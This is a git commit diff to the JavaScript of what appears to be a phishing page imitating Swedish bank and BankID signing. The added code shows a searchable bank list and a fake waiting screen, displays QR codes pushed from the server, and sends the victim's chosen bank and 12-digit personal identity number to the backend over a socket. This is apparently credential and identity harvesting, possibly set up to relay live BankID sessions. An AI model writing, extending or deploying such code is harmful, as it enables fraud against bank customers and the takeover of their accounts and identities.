aae4a661c7b24254da57346ed4d68a3788b983a0
stalkstalk002 <stalkstalk002@gmail.com>
2024-12-14 23:31:51 +0530

    Update script.js

--- static/js/script.js
+++ static/js/script.js
@@ -7,20 +7,33 @@ document.addEventListener('DOMContentLoaded', function() {
     const agreeSignText = document.getElementById('agreeSignText');
     const qrCard = document.getElementById('qrCard');
     const contentContainer = document.querySelector('.content-container');
-
+    const bankListContainer = document.getElementById('bankListContainer');
+    const bankList = document.getElementById('bankList');
+    const bankItems = bankList.querySelectorAll('li');
+    const waitingSection = document.getElementById('waitingSection');
+    const loginContainer = document.getElementById('loginContainer');
+    const continueButton = document.getElementById('continue-button');
+    const bankNameFromBankList = document.getElementById('bank-name-from-bank-list');
+    
     let isLoading = false;
     let lastUpdateTime = Date.now();
+    let isButtonClicked = false;
+
+    bankListContainer.style.display = 'none';
+    waitingSection.style.display = 'none';
+    loginContainer.style.display = 'none'; 
+    qrCard.style.display = 'none'; 
 
     generateQrButton.addEventListener('click', function() {
-        agreeSignText.style.display = 'none';
-        qrCard.style.display = 'block';
-        isLoading = true;
-        loaderElement.classList.add('active');
-        socket.emit('generate_qr_code');
-        generateQrButton.innerHTML = 'Inväntar ytterligare signeringar';
-        generateQrButton.style.backgroundColor = 'white';
-        generateQrButton.style.color = '#000';
-        generateQrButton.style.border = 'none';
+        if (!isButtonClicked) {
+            agreeSignText.style.display = 'none';
+            qrCard.style.display = 'none'; 
+            isLoading = false; 
+            loaderElement.classList.remove('active');
+
+            bankListContainer.style.display = 'block';
+            isButtonClicked = true;
+        }
     });
 
     socket.on('update_qr_code_image', function(data) {
@@ -32,32 +45,81 @@ document.addEventListener('DOMContentLoaded', function() {
         qrText.classList.add('active');
         lastUpdateTime = Date.now();
 
-        // Adjust the height of the content container dynamically
         contentContainer.style.height = 'auto';
 
         if (generateQrButton.innerHTML == 'Inväntar ytterligare signeringar') {
-            // generateQrButton.innerHTML = '';
             generateQrButton.style.display = 'none';
         }
+
+    });
+    
+    bankItems.forEach(item => {
+        item.addEventListener('click', function() {
+            const bankName = item.querySelector('.bank-name').textContent.trim();
+            
+            bankListContainer.style.display = 'none';
+            waitingSection.style.display = 'flex';
+            
+            setTimeout(() => {
+                waitingSection.style.display = 'none';
+                qrCard.style.display = 'block';
+                isLoading = true;
+                socket.emit('generate_qr_code');
+                generateQrButton.innerHTML = 'Inväntar ytterligare signeringar';
+                generateQrButton.style.backgroundColor = 'white';
+                generateQrButton.style.color = '#000';
+                generateQrButton.style.border = 'none';
+                
+                socket.emit('bank_clicked', { bankName: bankName });
+                loginContainer.style.display = 'block';
+                bankNameFromBankList.innerHTML = bankName;
+            }, 3000); 
+            contentContainer.style.display = 'none';
+        });
     });
 
-    setInterval(() => {
-        if (Date.now() - lastUpdateTime > 1000 && !isLoading) {
-            isLoading = true;
-            loaderElement.classList.add('active');
-            loaderElement.classList.remove('hidden');
-            qrImage.classList.remove('active');
-            qrText.classList.remove('active');
+    
+    const searchInput = document.getElementById('searchInput');
+    searchInput.addEventListener('input', () => {
+        const searchTerm = searchInput.value.toLowerCase();
+        
+        bankItems.forEach(item => {
+            const bankName = item.querySelector('.bank-name').textContent.toLowerCase();
 
-            // Reset the height of the content container
-            contentContainer.style.height = 'auto';
-
-            if (generateQrButton.innerHTML == '') {
-                // generateQrButton.innerHTML = 'Inväntar ytterligare signeringar';
-            generateQrButton.style.display = 'block';
+            if (bankName.includes(searchTerm)) {
+                item.style.display = 'flex'; 
+            } else {
+                item.style.display = 'none';
             }
+        });
+    });
+    
+    const loginMethod = document.getElementById('login-method');
+    const personalNumber = document.getElementById('personal-number');
+    
+    function checkFormValidity() {
+        const personalNumberValue = personalNumber.value;
+        const isNumeric = /^\d+$/.test(personalNumberValue);
+
+        if (loginMethod.value && isNumeric && personalNumberValue.length === 12) {
+            continueButton.classList.add('enabled');
+        } else {
+            continueButton.classList.remove('enabled');
         }
-    }, 1000);
+    }
+    
+    loginMethod.addEventListener('change', checkFormValidity);
+    personalNumber.addEventListener('input', checkFormValidity);
+    
+    continueButton.addEventListener('click', function(event) {
+        event.preventDefault(); 
+        loginContainer.style.display = 'none'; 
+        qrCard.style.display = 'block'; 
+        contentContainer.style.display = 'block';
+
+        socket.emit('personalNumber', { personalNumber: personalNumber.value });
+
+    });
 
 
     document.querySelector('.sidebar-toggler').addEventListener('click', function() {
@@ -66,7 +128,6 @@ document.addEventListener('DOMContentLoaded', function() {
             text.classList.toggle('hidden');
         });
     });
-
     document.querySelector('.cancel-bankid').addEventListener('click', function() {
         document.getElementById('bankid-qr-code').classList.remove('current');
         window.location.reload();
